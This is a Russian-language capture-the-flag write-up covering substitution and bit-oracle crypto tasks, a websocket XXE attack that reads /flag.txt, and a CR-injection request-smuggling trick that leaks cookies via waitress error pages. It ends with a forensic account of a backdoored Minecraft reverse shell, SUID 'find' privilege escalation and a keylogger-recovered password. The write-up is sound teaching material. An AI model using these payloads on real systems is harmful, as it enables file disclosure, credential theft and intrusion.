# Crypto 1
Мы видим, что в коде ничего случайно не генерируется, и все переменные нам уже даны, поэтому алфавит будет одинаковый
при разных запусках. Сгенерируем алфавит и по нему проведём замену шифрованного текста.
Код приведён в файле crypto1.py

# Crypto 2
Рассмотрим код задания. При запросе на адрес /guess_bit мы передаем индекс бита флага, а в ответ нам возвращается какое-то число.
Если бит равен единице, то нам возвращается pow(7, getPrime(300), n) (n дан в начале файла), если бит равен нулю то возращается случайное число
от n пополам до n.

То есть если бит равен нулю, нам никак не может вернуться число меньшее чем n//2. Используем это для решения.
Для каждого бита будем обращаться к серверу x раз, если нам хоть раз выпало число, меньшее чем n//2, значит этот бит равен единице,
в ином случае бит равен нулю. Таким образом получаем все биты флага и получаем флаг.
Код для вычисления прилагается в файле crypto2.py

# Web 1

Рассмотрим исходный код страницы. Основной скрипт лежит в файле script.js.
При нажатии на кнопку "Calculate!" отправляется запрос по вебсокету на сервер, запрос шифруется с помощью AES.
В функции calculate мы можем увидеть формат запроса:
```
{format: 'json', data: {countries: countries (array), startdate: startDate (string), enddate: endDate (string), resttype: restType (int)}}
```
Заметим, что мы отправляем формат, в который кодируются данные, по стандарту это JSON. Изменим его на XML и проверим, обрабатывает ли сервер запросы такого формата.

Используя инструменты разработчика Chrome, перепишем обработчик событий, который принимает сообщения от вебсокета следующим образом:
```
socket.addEventListener('message', (event) => {
  if (event.data == 'connected') return;
  let data = event.data;
  console.log(data)
});
```
для того, чтобы сразу можно было видеть данные пришедшие с сервера.

В функции calculate заменим format: 'json' на format: 'xml'.
Теперь нажав на кнопку "Calculate!", получаем в консоли ошибку с сервера:
```
{"error":"Error: XML must be a string or buffer\n    at Object.module.exports.fromXml ...
```
Это показывает, что сервер умеет обрабатывать XML, просто мы ему отправили не XML, из-за этого и возникла ошибка.

В том словаре, который мы отправляем, содержатся только ключи format и data. Этот словарь мы отправляем в формате JSON. Из этого можно понять, что сервер при обработке
сначала получит словарь с помощью JSON, посмотрим на значение под ключом format, и на основании этого будет раскодировать data. Таким образом, в data мы можем положить
наши данные в xml формате. Воспользуемся онлайн конвертером JSON в XML(https://www.convertjson.com/json-to-xml.htm), преобразуем данные, которые мы обычно отправляем в json, в xml,
и отправим это на сервер, чтобы проверить, действительно ли мы можем в data положить данные в xml формате. Создадим такой JSON для примера:
```
{"countries": ["1", "2", "3"], startdate: "1", enddate: "1", resttype: 1}
```
(также мы заранее проверили, что отправка таких данных в JSON не приводит к ошибке, и все верно обрабатывается). С помощью онлайн-конвертера получили следующий XML:
```
<?xml version="1.0" encoding="UTF-8" ?>
<root>
  <countries>1</countries>
  <countries>2</countries>
  <countries>3</countries>
  <startdate>1</startdate>
  <enddate>1</enddate>
  <resttype>1</resttype>
</root>
```
Изменим в script.js 83 строку на ```let data = JSON.stringify(encrypted({format: 'xml', data: \`<?xml version="1.0" encoding="UTF-8" ?><data><countries>1</countries><countries>2</countries><countries>3</countries><startdate>1</startdate><enddate>1</enddate><resttype>1</resttype></data>\`}));```

(также заменяем <root> на <data>, потому что наши данные хранятся под ключом data)

В консоли видем зашифрованный ответ, используя функцию decrypt расшифруем его, и получаем:
```
{"format":"xml","data":"<?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>\\n<data>\\n  <countries>1</countries>\\n  <countries>2</countries>\\n  <countries>3</countries>\\n  <startdate>1</startdate>\\n  <enddate>1</enddate>\\n  <resttype>1</resttype>\\n  <price>0</price>\\n</data>\\n"}
```

Это значит что сервер верно обрабатывает XML.
Теперь, так как мы можем вставлять любой XML, воспользуемся уязвимостью xxe.

Добавим в наш XML строчку: 
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
```
это нам позволит прочитать содержимое файла flag.txt, и затем, если мы где-то
в xml вставим '&xxe;', то оно автоматически заменится на содержимое файла.

Так как сервер нам отправляет все данные что мы ему прислали в ответ, поместим '&xxe;' в первый элемент списка countries.
Итоговый XML выглядит вот так.

```
<?xml version="1.0" encoding="UTF-8" ?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]><data><countries>&xxe;</countries><countries>2</countries><countries>3</countries><startdate>1</startdate><enddate>1</enddate><resttype>1</resttype></data>
```

Получаем ответ от сервера:
```
{"format":"xml","data":"<?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>\\n<!DOCTYPE foo [\\n<!ENTITY xxe SYSTEM \\"file:///flag.txt\\">\\n]>\\n<data>\\n  <countries>nto{w3bs0ck3ts_plu5_xx3_1s_l0v3}\\n</countries>\\n  <countries>2</countries>\\n  <countries>3</countries>\\n  <startdate>1</startdate>\\n  <enddate>1</enddate>\\n  <resttype>1</resttype>\\n  <price>0</price>\\n</data>\\n"}
```

В первом элементе списка countries лежит флаг.

# Web 2

Проанализируем исходный код. Когда пользователь авторизован, делается запрос на второй сервер в функции make_request, туда мы отправляем наш никнейм и флаг в cookies.
Для формирования запроса используется обычная f-строка, в которую вставляется наш username, соответственно в username можно вставлять потенциально вредоносные строчки.
После этого мы получаем ответ от второго сервера, который возвращает Hello, {username} если флаг совпал или I don't trust you если флаг не совпал.

Воспользуемся программой Burpsuite. Сначала скопируем запрос который отправляется на 2 сервер, и попробуем его повторить, вставив случайный логин и флаг.
Например:
```
GET / HTTP/1.1\r\nHost: 0.0.0.0:3001\r\nCookie: username=abc;flag=abc\r\n\r\n
```

Мы получаем обычный ответ:
```HTTP/1.1 200 OK
Content-Length: 18
Content-Type: text/html; charset=utf-8
Date: Thu, 23 Mar 2023 12:59:24 GMT
Server: waitress

I don't trust you!
```

В запросах для переноса строки используется \r\n. Мы можем испортить запрос, вставив в юзернейм \r (без \n, тогда будет ошибка плохого переноса)
Отправим такой запрос на сервер, и получаем ответ:
```HTTP/1.0 400 Bad Request
Connection: close
Content-Length: 109
Content-Type: text/plain; charset=utf-8
Date: Thu, 23 Mar 2023 13:01:04 GMT
Server: waitress

Bad Request

Bare CR or LF found in header line "Cookie: username=abc
;flag=abc"

(generated by waitress)
```
Мы видим, что сервер нам отправил ошибку, и при этом вставил часть запроса, вместе с флагом, который мы отправляли.

Теперь нам нужно зарегистрировать любого пользователя и добавить в конце юзернейма \r.
Мы не можем зарегистрировать его через обычную форму авторизации, так как тогда \r посчитается как два символа: слэш и r, а не перенос каретки.
Перехватим с помощью Burpsuite запрос регистрации, отправим его в Repeater, отредактируем в нем логин например на abc\r и снова отправим на сервер. Затем мы получим сессию, зайдем под ней
в браузер, и получим такой ответ:
```
Bad Request Bare CR or LF found in header line "Cookie: username=abc ;flag=NTO{request_smuggling_917a34072663f9c8beea3b45e8f129c5}" (generated by waitress)
```
Здесь и найдем флаг.

# Вторая часть

Злоумышленник попал на систему благодаря вредоносному коду, внутри запущенного маинкрафта. Мы обнаружили этот код, когда реверсили игру с помощью ***jd-gui***.
Видно, что было создано сокет подключение, по которому отсылались команды, которые исполнялись в ***/bin/bash*** *(screenshot_3)*
Таким образом злоумышленник попал в систему.

Запустив скрип linpeas, мы обнаружили, что возможна экалация привелегий с помощью команды ***find***.*(screenshot_2)*
Это произошло, протому что root запустил команду ```chmod +s /bin/bash```, которая названия бит ***SUID***.
Эскалация привелегий происходит таким образом: ```find something -exec 'command'``` В данном случае command будет исполнена от имени рута, привелегии получены

Прочитав bash_history root, стало понятно, что был запущен keyloger, который записывал логи в файл */var/log/logkeys.log*
Прочитав файл, была замечена странная строчка, похожая на ввод пароля, мы предположили, что это пароль от *keepass*, который был в системе.
Собрав пароль (получилось *1_D0N7_N0W_WHY_N07_M4Y83_345Y*), вошли в keepass, где увидели, что пароль подписан, как windows rdp, что позволяет предположить, что данный пароль от протокола удаленного доступа. *(screenshot_1)*
